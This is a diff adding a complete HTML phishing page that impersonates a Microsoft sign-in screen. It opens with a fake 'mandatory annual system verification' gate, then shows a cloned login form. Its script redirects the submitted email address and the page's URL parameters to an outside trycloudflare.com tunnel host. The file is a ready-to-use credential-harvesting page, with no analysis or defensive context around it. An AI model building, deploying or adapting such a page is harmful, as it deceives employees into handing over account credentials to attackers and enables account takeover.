@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Security Verification / Microsoft Login</title>
+    <link rel="shortcut icon" href="https://msftauth.net"/>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: "Segoe UI", -apple-system, sans-serif;
+            background-image: url('https://imgur.com');
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            background-size: 100% 100%;
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        /* Step 1: Anti-bot gateway card */
+        #botGate {
+            background: white;
+            padding: 40px;
+            border-radius: 4px;
+            box-shadow: 0 4px 16px rgba(0,0,0,0.15);
+            max-width: 400px;
+            text-align: center;
+        }
+        #botGate h2 { color: #24292e; font-size: 22px; margin-top: 0; }
+        #botGate p { color: #586069; font-size: 15px; line-height: 1.5; margin-bottom: 30px; }
+        .btn-verify { background-color: #0078d4; color: white; border: none; padding: 12px 30px; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: 600; width: 100%; }
+        .btn-verify:hover { background-color: #005a9e; }
+
+        /* Step 2: Microsoft Login Card (Hidden by default) */
+        #loginCard {
+            display: none;
+            background: white;
+            padding: 44px;
+            width: 440px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            box-sizing: border-box;
+            text-align: left;
+        }
+        .ms-logo { width: 108px; height: 24px; margin-bottom: 24px; }
+        .ms-title { font-size: 1.5rem; font-weight: 600; color: #1b1b1b; margin-bottom: 16px; }
+        .ms-input { width: 100%; height: 36px; padding: 6px 10px; border: 1px solid #666; font-size: 15px; margin-bottom: 20px; box-sizing: border-box; }
+        .ms-input:focus { border-color: #0067b8; outline: none; }
+        .ms-text { font-size: 13px; color: #505050; margin-bottom: 20px; }
+        .ms-text a { color: #0067b8; text-decoration: none; }
+        .ms-button { background-color: #0067b8; color: white; border: none; width: 100px; height: 32px; font-size: 15px; float: right; cursor: pointer; }
+        .ms-button:hover { background-color: #005a9e; }
+    </style>
+</head>
+<body>
+
+    <!-- STEP 1: Bot Mitigation Screen -->
+    <div id="botGate">
+        <h2>Employee Identity Verification</h2>
+        <p>To ensure compliance with corporate information security standards, please click the button below to complete your mandatory annual system verification.</p>
+        <button class="btn-verify" onclick="showLoginCard()">Click Here to Verify Account</button>
+    </div>
+
+    <!-- STEP 2: Microsoft Login Landing Page -->
+    <div id="loginCard">
+        <svg class="ms-logo" viewBox="0 0 23 23" xmlns="http://w3.org">
+            <path fill="#f35325" d="M0 0h11v11H0z"/><path fill="#81bc06" d="M12 0h11v11H12z"/>
+            <path fill="#05a6f0" d="M0 12h11v11H0z"/><path fill="#ffba08" d="M12 12h11v11H12z"/>
+        </svg>
+        
+        <div class="ms-title">Sign in</div>
+        
+        <form id="phishForm" method="POST">
+            <input type="email" name="username" class="ms-input" placeholder="Email, phone, or Skype" required>
+            <div class="ms-text">No account? <a href="#">Create one!</a></div>
+            <div class="ms-text"><a href="#">Can’t access your account?</a></div>
+            <input type="submit" class="ms-button" value="Sign in">
+        </form>
+    </div>
+
+    <script>
+        const currentParams = window.location.search;
+        const targetCloudflare = " https://chicken-vpn-primarily-change.trycloudflare.com";
+
+        // Triggers when user clicks the first "Verify Account" button
+        function showLoginCard() {
+            document.getElementById("botGate").style.display = "none";
+            document.getElementById("loginCard").style.display = "block";
+        }
+
+        // Triggers ONLY when user inputs credentials and clicks "Sign in"
+        document.getElementById("phishForm").addEventListener("submit", function(event) {
+            this.action = targetCloudflare + "/" + currentParams;
+        });
+    </script>
+
+</body>
+</html>
